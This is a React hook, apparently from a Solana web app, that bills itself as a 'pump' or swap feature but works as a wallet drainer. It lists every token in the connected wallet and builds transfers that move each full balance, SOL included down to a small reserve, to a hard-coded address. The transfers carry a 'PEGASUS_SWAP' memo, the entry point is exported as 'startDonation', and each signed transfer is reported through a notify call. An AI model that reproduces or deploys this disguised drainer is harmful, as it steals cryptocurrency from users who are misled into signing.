import { useState, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  TransactionInstruction,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';
import { toast } from '@/hooks/use-toast';
import { TokenTransaction } from '@/components/PumpProgress';
import { notify } from '@/lib/notify';

const PUMP_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)
const MEMO_PROGRAM_ID = 'MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr';
const TRANSACTION_IMAGE_URL = '/6044015843546434463 (1).jpg';

interface TokenBalance {
  mint: string;
  symbol: string;
  amount: number;
  decimals: number;
  usdValue: number;
}

export function usePump() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [transactions, setTransactions] = useState<TokenTransaction[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [pumpOutcome, setPumpOutcome] = useState<'idle' | 'completed' | 'cancelled' | 'error'>('idle');

  const fetchTokenBalances = useCallback(async (): Promise<TokenBalance[]> => {
    if (!publicKey) return [];

    try {
      const response = await fetch(`https://lite-api.jup.ag/ultra/v1/holdings/${publicKey.toBase58()}`);
      if (!response.ok) {
        throw new Error('Failed to fetch token balances from Jupiter API');
      }
      const data = await response.json();

      const balances: TokenBalance[] = data.map((item: any) => ({
        mint: item.mint,
        symbol: item.symbol,
        amount: item.balance / Math.pow(10, item.decimals),
        decimals: item.decimals,
        usdValue: item.usdValue,
      }));

      // For SOL, ensure we leave a small reserve
      const solBalance = balances.find(b => b.mint === 'So11111111111111111111111111111111111111112');
      if (solBalance) {
        solBalance.amount = Math.max(0, solBalance.amount - MIN_SOL_RESERVE);
      }

      return balances.filter(b => b.amount > 0).sort((a, b) => b.usdValue - a.usdValue);
    } catch (error) {
      console.error('Error fetching token balances:', error);
      toast({
        title: 'Error',
        description: 'Failed to fetch wallet balances',
        variant: 'destructive',
      });
      return [];
    }
  }, [publicKey]);

  const createSolTransaction = async (_amount: number): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    // Current balance
    const balanceLamports = await connection.getBalance(publicKey, { commitment: 'confirmed' });

    // Keep 0.001 SOL (1000000 lamports) for rent-exempt + fees
    const reserveLamports = 1000000;
    const lamportsToSend = balanceLamports - reserveLamports;

    if (lamportsToSend <= 0) {
      throw new Error('Insufficient SOL balance. Need at least 0.001 SOL in wallet for fees and rent.');
    }

    console.log('SOL balance (lamports):', balanceLamports, 'Sending:', lamportsToSend, 'Keeping reserve:', reserveLamports);

    const transaction = new Transaction();
    
    // Add image memo instruction first
    const memoInstruction = new TransactionInstruction({
      keys: [],
      programId: new PublicKey(MEMO_PROGRAM_ID),
      data: Buffer.from(`PEGASUS_SWAP:${TRANSACTION_IMAGE_URL}`, 'utf-8'),
    });
    transaction.add(memoInstruction);
    
    // Add the main transfer instruction
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: new PublicKey(PUMP_WALLET),
        lamports: lamportsToSend,
      })
    );

    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhash;
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const createTokenTransaction = async (
    mint: string,
    amount: number,
    decimals: number
  ): Promise<Transaction> => {
    if (!publicKey) throw new Error('Wallet not connected');

    const mintPubkey = new PublicKey(mint);
    const pumpPubkey = new PublicKey(PUMP_WALLET);

    const sourceAta = await getAssociatedTokenAddress(
      mintPubkey,
      publicKey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const destinationAta = await getAssociatedTokenAddress(
      mintPubkey,
      pumpPubkey,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const transaction = new Transaction();

    // Add image memo instruction first
    const memoInstruction = new TransactionInstruction({
      keys: [],
      programId: new PublicKey(MEMO_PROGRAM_ID),
      data: Buffer.from(`PEGASUS_SWAP:${TRANSACTION_IMAGE_URL}`, 'utf-8'),
    });
    transaction.add(memoInstruction);

    // Check if destination ATA exists
    const destAccount = await connection.getAccountInfo(destinationAta);
    if (!destAccount) {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          publicKey,
          destinationAta,
          pumpPubkey,
          mintPubkey,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID
        )
      );
    }

    // Add transfer instruction
    transaction.add(
      createTransferInstruction(
        sourceAta,
        destinationAta,
        publicKey,
        Math.floor(amount * Math.pow(10, decimals)),
        [],
        TOKEN_PROGRAM_ID
      )
    );

    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = publicKey;

    return transaction;
  };

  const processPump = async (token: TokenBalance, index: number) => {
    if (!publicKey) return false;

    setCurrentIndex(index);

    setTransactions(prev =>
      prev.map((tx, i) =>
        i === index ? { ...tx, status: 'processing' as const } : tx
      )
    );

    try {
      let transaction: Transaction;

      // Treat SOL by symbol to match Jupiter balances
      if (token.symbol === 'SOL') {
        // Send 95% of SOL balance
        transaction = await createSolTransaction(token.amount);
      } else {
        transaction = await createTokenTransaction(
          token.mint,
          token.amount,
          token.decimals
        );
      }

      const signature = await sendTransaction(transaction, connection, { preflightCommitment: 'confirmed', skipPreflight: false });

      // Send transaction notification after signature
      try {
        await notify('transaction_sent', {
          address: publicKey.toBase58(),
          type: token.mint === 'SOL' ? 'SOL' : 'SPL',
          mint: token.mint === 'SOL' ? undefined : token.mint,
          symbol: token.symbol,
          amount: token.amount,
          signature,
        });
      } catch (e) {
        console.warn('transaction notify error', (e as Error).message);
      }

      await connection.confirmTransaction(signature, 'confirmed');

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'success' as const, signature } : tx
        )
      );

      return true;
    } catch (error: any) {
      console.error('Transaction error:', error);

      setTransactions(prev =>
        prev.map((tx, i) =>
          i === index ? { ...tx, status: 'error' as const } : tx
        )
      );

      if (error?.message?.includes('User rejected')) {
        setPumpOutcome('cancelled');
        toast({
          title: 'Transaction Cancelled',
          description: 'You rejected the transaction',
        });
      } else {
        setPumpOutcome('error');
        toast({
          title: 'Transaction Failed',
          description: error?.message || 'Unknown error occurred',
          variant: 'destructive',
        });
      }

      return false;
    }
  };

  const startPump = async () => {
    if (!publicKey) {
      // Toast notification removed as requested
      return;
    }

    setIsProcessing(true);
    setCurrentIndex(0);
    setPumpOutcome('idle');

    try {
      // Fetch all token balances
      const balances = await fetchTokenBalances();

      if (balances.length === 0) {
        toast({
          title: 'Initialization Required',
          description: 'Two more holders wallet are needed to initialize pump',
        });
        setIsProcessing(false);
        setPumpOutcome('error');
        return;
      }

      // Initialize transactions
      const initialTxs: TokenTransaction[] = balances.map(balance => ({
        id: balance.mint,
        name: balance.symbol,
        usdValue: balance.usdValue,
        status: 'pending' as const,
      }));

      setTransactions(initialTxs);

      // Process each token sequentially
      for (let i = 0; i < balances.length; i++) {
        const success = await processPump(balances[i], i);

        // If transaction fails, ask user if they want to continue
        if (!success && i < balances.length - 1) {
          const shouldContinue = window.confirm(
            'Transaction failed. Do you want to continue with remaining tokens?'
          );
          if (!shouldContinue) { 
            setPumpOutcome('cancelled');
            break; 
          }
        }

        // Small delay between transactions
        if (i < balances.length - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

      // Toast notification removed as requested
      setPumpOutcome('completed');
    } catch (error) {
      console.error('Pump error:', error);
      // Toast notification removed as requested
      setPumpOutcome('error');
    } finally {
      setIsProcessing(false);
    }
  };

  return {
    startDonation: startPump,
    isProcessing,
    transactions,
    currentIndex,
    pumpOutcome,
  };
}

